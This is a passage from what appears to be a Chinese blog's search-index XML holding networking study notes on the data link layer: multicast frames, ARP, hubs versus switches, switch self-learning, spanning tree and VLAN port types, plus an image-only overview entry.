data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414477831183.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>主机A将该<strong>多播帧</strong>发送出去，主机B、C、D都会收到该<strong>多播帧</strong></p><p><strong>主机B和C发现该多播帧的目的MAC地址在自己的多播组列表中</strong>，主机B和C都会接受该帧</p><p>主机D发现该<strong>多播帧</strong>的目的MAC地址不在自己得多播组列表中，则丢弃该<strong>多播帧</strong>。</p><h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h3><p>IP地址标识两部分信息：</p><ul><li>网路编号(标识网路)</li><li>主机编号(标识同一网络上的不同主机)</li></ul><p>MAC地址不具有区分不同网路的功能</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414475230181.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414475230181.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414472987179.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414472987179.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="数据包转发过程中IP地址与MAC地址的变化情况"><a href="#数据包转发过程中IP地址与MAC地址的变化情况" class="headerlink" title="数据包转发过程中IP地址与MAC地址的变化情况"></a>数据包转发过程中IP地址与MAC地址的变化情况</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414469268177.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414469268177.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414465235175.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414465235175.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>如何从IP地址找到其对应的MAC地址：ARP协议(地址解析协议)</p><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414462011173.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414462011173.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ARP高速缓存表</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414457970171.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414457970171.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>当主机B要给主机C发送数据包时，会首先在自己的ARP高速缓存表中查找主机C的IP地址所对应的MAC地址，但未找到，因此，主机B需要发送ARP请求报文，来获取主机C的MAC地址。</p></blockquote><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414456160169.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414456160169.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ARP请求报文被封装在MAC帧中发送，目的地址为广播地址。</p><p>主机B发送封装有ARP请求报文的广播帧，总线上的其他主机都能收到该广播帧。</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414454599167.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414454599167.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>收到ARP请求报文的主机A和主机C会把ARP请求报文交给<strong>上层的ARP进程</strong></p><p>主机A发现所询问的IP地址不是自己的IP地址，因此不用理会</p><p>主机C的发现所询问的IP地址是自己的IP地址，需要进行相应</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414452390165.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414452390165.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414451032163.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414451032163.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414449593161.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414449593161.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414448075159.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414448075159.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>ARP协议只能在一段链路或一个网络上使用，而不能跨网络使用</strong>。ARP协议的使用是逐段链路进行的</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414445467157.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414445467157.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ARP表中的IP地址与MAC地址的对应关系记录，是会定期自动删除的，因为IP地址与MAC地址的对应关系不是永久性的。</p><h2 id="集线器与交换机的区别"><a href="#集线器与交换机的区别" class="headerlink" title="集线器与交换机的区别"></a>集线器与交换机的区别</h2><h4 id="集线器：在物理层扩展以太网"><a href="#集线器：在物理层扩展以太网" class="headerlink" title="集线器：在物理层扩展以太网"></a>集线器：在物理层扩展以太网</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414443282155.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414443282155.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>传统以太网最初是使用<strong>粗同轴电缆</strong>，后来演进到使用比较便宜的<strong>细同轴电缆</strong>，最后发展为使用更便宜和更灵活的<strong>双绞线</strong>。<br>采用双绞线的以太网采用<strong>星形拓扑</strong>，在星形的中心则增加了一种可靠性非常高的设备，叫做**集线器 (hub)**。<br>集线器是也可以看做多口中继器，每个端口都可以成为一个中继器，中继器是对减弱的信号进行放大和发送的设备<br><strong>集线器的以太网在逻辑上仍是个总线网，需要使用CSMA/CD协议来协调各主机争用总线，只能工作在半双工模式，收发帧不能同时进行</strong></p><p><strong>使用集线器扩展</strong>：将多个以太网段连成更大的、多级星形结构的以太网</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414441364153.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414441364153.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>使原来属于不同碰撞域的以太网上的计算机能够进行跨碰撞域的通信。扩大了以太网覆盖的地理范围。</p><p>碰撞域增大了，但总的吞吐量并未提高。</p><p>如果不同的碰撞域使用不同的数据率，那么就不能用集线器将它们互连起来。</p><blockquote><p><strong>碰撞域（collision domain）</strong>又称为<strong>冲突域</strong>，是指网络中一个站点发出的帧会与其他站点发出的帧产生碰撞或冲突的那部分网络。碰撞域越大，发生碰撞的概率越高。</p></blockquote><h3 id="以太网交换机-在数据链路层扩展以太网"><a href="#以太网交换机-在数据链路层扩展以太网" class="headerlink" title="以太网交换机-在数据链路层扩展以太网"></a>以太网交换机-在数据链路层扩展以太网</h3><p>扩展以太网更常用的方法是在数据链路层进行。早期使用网桥，现在使用以太网交换机。</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414439559151.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414439559151.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>网桥</strong></p><p>网桥工作在数据链路层。它根据 MAC 帧的目的地址对收到的帧进行转发和过滤。当网桥收到一个帧时，并不是向所有的接口转发此帧，而是先检查此帧的目的MAC 地址，然后再确定将该帧转发到哪一个接口，或把它丢弃。</p><p><strong>交换机</strong></p><p>1990 年问世的交换式集线器 (switching hub) 可明显地提高以太网的性能。交换式集线器常称为以太网交换机 (switch) 或第二层交换机 (L2 switch)，强调这种交换机工作在数据链路层。以太网交换机实质上就是一个多接口的网桥</p><h4 id="集线器hub与交换机switch的区别"><a href="#集线器hub与交换机switch的区别" class="headerlink" title="集线器hub与交换机switch的区别"></a>集线器hub与交换机switch的区别</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414437096149.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414437096149.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">使用<strong>集线器</strong>互连而成的共享总线式以太网上的某个主机，要给另一个主机发送单播帧，该单播帧会通过共享总线传输到<strong>总线上的其他各个主机</strong>。使用交换机互连而成的交换式以太网上的某个主机，要给另一个主机发送单播帧，该单播帧进入交换机后，交换机会将该单播帧转发给目的主机，<strong>而不是网络中的其他各个主机</strong>。交换机会有帧交换表(通过自学医算法自动地逐渐建立起来的)。即插即用设备。</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414435343147.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414435343147.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>存储转发：把整个数据帧先缓存再转发</p><p>直通方式：接收数据帧的同时就<strong>立即按数据帧的目的 MAC 地址决定该帧的转发接口</strong>，因而提高了帧的转发速度。<strong>缺点</strong>是它不检查差错就直接将帧转发出去，因此有可能也将一些无效帧转发给其他的站。</p><blockquote><p>这个例子的前提条件是忽略ARP过程，并假设交换机的帧交换表已经学习或配置好了</p></blockquote><p>多台主机同时给另一台主机发送单播帧</p><p>集线器以太网：会产生碰撞，遭遇碰撞的帧会传播到总线上的各主机</p><p>交换机以太网：会将它们<strong>缓存</strong>起来，然后逐个转发给目的主机，不会产生碰撞</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414432537145.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414432537145.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>集线器扩展以太网和交换机扩展以太网区别</strong></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414430022143.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414430022143.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414428144141.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414428144141.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414426532139.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414426532139.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006132458346.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006132458346.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>广播域（broadcast domain）：指这样一部分网络，其中任何一台设备发出的广播通信都能被该部分网络中的所有其他设备所接收。</p></blockquote><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414422697137.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414422697137.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414420810135.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414420810135.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>工作在数据链路层的以太网交换机，其性能远远超过工作在物理层的集线器，而且价格并不贵，这就使得集线器逐渐被市场淘汰。</p><h2 id="以太网交换机自学习和转发帧的流程"><a href="#以太网交换机自学习和转发帧的流程" class="headerlink" title="以太网交换机自学习和转发帧的流程"></a>以太网交换机自学习和转发帧的流程</h2><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414419150133.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414419150133.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414417085131.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414417085131.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ol><li><p>A 先向 B 发送一帧。该帧从接口 1 进入到交换机</p></li><li><p>交换机收到帧后，先查找（图中左边）交换表。没有查到应从哪个接口转发这个帧给 B</p></li><li><p>交换机把这个帧的源地址 A 和接口 1 写入（图中左边）交换表中</p></li><li><p>交换机向除接口 1 以外的所有的接口广播这个帧</p></li><li><p>接口 4到接口 2，先查找（图中右边）交换表。没有查到应从哪个接口转发这个帧给 B</p></li><li><p>交换机把这个帧的源地址 A 和接口 2 写入（图中右边）交换表中</p></li><li><p>除B主机之外与该帧的目的地址不相符，将丢弃该帧</p></li><li><p>主机B发现是给自己的帧，接受该帧</p></li></ol><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414408163129.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414408163129.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ol><li>B 向 A 发送一帧。该帧从接口 3 进入到交换机</li><li>交换机收到帧后，先查找（图中左边）交换表。发现（图中左边）交换表中的 MAC 地址有 A，表明要发送给A的帧应从接口1转发出去。于是就把这个帧传送到接口 1 转发给 A。</li><li>主机 A 发现目的地址是它，就接受该帧</li><li>交换机把这个帧的源地址 B 和接口 3 写入（图中左边）交换表中</li></ol><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414405379127.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414405379127.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ol><li><p>E 向 A发送一帧</p></li><li><p>交换机收到帧后，先查找（图中右边）交换表。发现（图中右边）交换表中的 MAC 地址有 A，表明要发送给A的帧应从接口2转发出去。于是就把这个帧传送到接口 2 转发给 接口 4。</p></li><li><p>交换机把这个帧的源地址 E 和接口 3 写入（图中右边）交换表中</p></li><li><p>接口 4 到 左边的交换机，先查找（图中左边）交换表。发现（图中左边）交换表中的 MAC 地址有 A，表明要发送给A的帧应从接口1转发出去。于是就把这个帧传送到接口 1 转发给 A。</p></li><li><p>交换机把这个帧的源地址 E 和接口 4 写入（图中左边）交换表中</p></li><li><p>主机 A 发现目的地址是它，就接受该帧</p></li></ol><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414403191125.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414403191125.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006141423561.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006141423561.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>随着网络中各主机都发送了帧后，网络中的各交换机就可以学习到各主机的MAC地址，以及它们与自己各接口的对应关系</p><p>考虑到可能有时要在交换机的接口更换主机，或者主机要更换其网络适配器，这就需要更改交换表中的项目。为此，在交换表中每个项目都设有一定的有效时间。过期的项目就自动被删除。</p><p>以太网交换机的这种自学习方法使得以太网交换机能够即插即用，不必人工进行配置，因此非常方便。</p></blockquote><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414396681123.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414396681123.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="以太网交换机的生成树协议STP"><a href="#以太网交换机的生成树协议STP" class="headerlink" title="以太网交换机的生成树协议STP"></a>以太网交换机的生成树协议STP</h2><h4 id="如何提高以太网的稳定性"><a href="#如何提高以太网的稳定性" class="headerlink" title="如何提高以太网的稳定性"></a>如何提高以太网的稳定性</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414393220121.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414393220121.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414391227119.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414391227119.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>冗余链路会带来负面效应——形成<strong>网络环路</strong></p><ul><li>广播风暴</li><li>主机收到重复的广播帧</li><li>交换机的帧交换表振荡(漂移)</li></ul><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414388271117.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414388271117.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="生成树协议STP"><a href="#生成树协议STP" class="headerlink" title="生成树协议STP"></a>生成树协议STP</h4><p>构建一个逻    辑上没有环路的网络(其逻辑拓扑结构是树型的)</p><p>确保联通整个网络；网络物理拓扑结构发生变化时交换机将进行生成树的重新计算</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006142153104.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006142153104.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006142218694.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221006142218694.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="虚拟局域网VLAN"><a href="#虚拟局域网VLAN" class="headerlink" title="虚拟局域网VLAN"></a>虚拟局域网VLAN</h2><h3 id="为什么要虚拟局域网VLAN"><a href="#为什么要虚拟局域网VLAN" class="headerlink" title="为什么要虚拟局域网VLAN"></a>为什么要虚拟局域网VLAN</h3><p><strong>广播风暴</strong></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414379660115.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414379660115.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>分割广播域的方法</strong></p><blockquote><p>为了分割广播域，所以虚拟局域网VLAN技术应运而生</p></blockquote><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414376636113.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414376636113.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>将局域网内的设备划分成与物理位置无关的逻辑组的技术，这些逻辑组具有某些共同的需求。</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414373673111.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414373673111.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>利用以太网交换机可以很方便地实现虚拟局域网 VLAN (Virtual LAN)。</li><li><strong>IEEE 802.1Q</strong> 对虚拟局域网 VLAN 的定义： 虚拟局域网 VLAN 是由一些局域网网段构成的与物理位置无关的逻辑组，而这些网段具有某些共同的需求。<strong>每一个 VLAN 的帧都有一个明确的标识符</strong>，指明发送这个帧的计算机是属于哪一个 VLAN。</li><li><strong>同一个VLAN内部可以广播通信，不同VLAN不可以广播通信</strong></li><li>虚拟局域网其实只是局域网给用户提供的一种服务，而并不是一种新型局域网。</li><li>由于虚拟局域网是用户和网络资源的逻辑组合，因此可按照需要将有关设备和资源非常方便地重新组合，使用户从不同的服务器或数据库中存取所需的资源。</li></ul><h3 id="虚拟局域网VLAN的实现机制"><a href="#虚拟局域网VLAN的实现机制" class="headerlink" title="虚拟局域网VLAN的实现机制"></a>虚拟局域网VLAN的实现机制</h3><p>虚拟局域网VLAN技术是在交换机上实现的，需要交换机能够实现以下功能：</p><ul><li><p>能够处理带有VLAN标记的帧——<strong>IEEE 802.1 Q帧</strong>（对于用户主机是不可见的）</p></li><li><p>交换机的各端口可以支持不同的端口类型，<strong>不同端口类型的端口对帧的处理方式有所不同</strong></p></li></ul><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414370794109.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414370794109.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414368013107.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414368013107.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="Access端口"><a href="#Access端口" class="headerlink" title="Access端口"></a>Access端口</h4><p>交换机与用户计算机之间的互连</p><blockquote><p>同一个VLAN内部可以广播通信，不同VLAN不可以广播通信</p></blockquote><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414364278105.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414364278105.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="Trunk端口"><a href="#Trunk端口" class="headerlink" title="Trunk端口"></a>Trunk端口</h4><p>交换机之间或交换机与路由器之间的互连</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414361044103.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414361044103.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414356753101.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414356753101.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="华为交换机私有的Hybrid端口类型"><a href="#华为交换机私有的Hybrid端口类型" class="headerlink" title="华为交换机私有的Hybrid端口类型"></a>华为交换机私有的Hybrid端口类型</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941435299699.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941435299699.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941434946797.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941434946797.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941434575695.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941434575695.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络概论</title>
      <link href="/2023/01/01/gai-shu/"/>
      <url>/2023/01/01/gai-shu/</url>
      
        <content type="html"><![CDATA[<p><img src="/2023/01/01/gai-shu/image-20221003230419062.png" class="lazyload placeholder" data-srcset="/2023/01/01/gai-shu/image-20221003230419062.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/01/gai-shu/image-20221003230434581.png" class="lazyload placeholder" data-srcset="/2023/01/01/gai-shu/image-20221003230434581.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/01/gai-shu/image-20221003230803446.png" class="lazyload placeholder" data-srcset="/2023/01/01/gai-shu/image-20221003230803446.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/01/gai-shu/image-20221003233909905.png" class="lazyload placeholder" data-srcset="/2023/01/01/gai-shu/image-20221003233909905.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/01/gai-shu/image-20221003233931471.png" class="lazyload placeholder" data-srcset="/2023/01/01/gai-shu/image-20221003233931471.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/01/gai-shu/image-20221003234107202.png" class="lazyload placeholder" data-srcset="/2023/01/01/gai-shu/image-20221003234107202.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/01/gai-shu/image-20221003234246493.png" class="lazyload placeholder" data-srcset="/2023/01/01/gai-shu/image-20221003234246493.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/01/gai-shu/image-20221003234315250.png" class="lazyload placeholder" data-srcset="/2023/01/01/gai-shu/image-20221003234315250.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/01/gai-shu/image-20221003234422570.png" class="lazyload placeholder" data-srcset="/2023/01/01/gai-shu/image-20221003234422570.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/01/gai-shu/image-20221003234440665.png" class="lazyload placeholder" data-srcset="/2023/01/01/gai-shu/image-20221003234440665.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/01/gai-shu/image-20221003234514860.png" class="lazyload placeholder" data-srcset="/2023/01/01/gai-shu/image-20221003234514860.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/01/gai-shu/image-20221003233711681.png" class="lazyload placeholder" data-srcset="/2023/01/01/gai-shu/image-20221003233711681.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
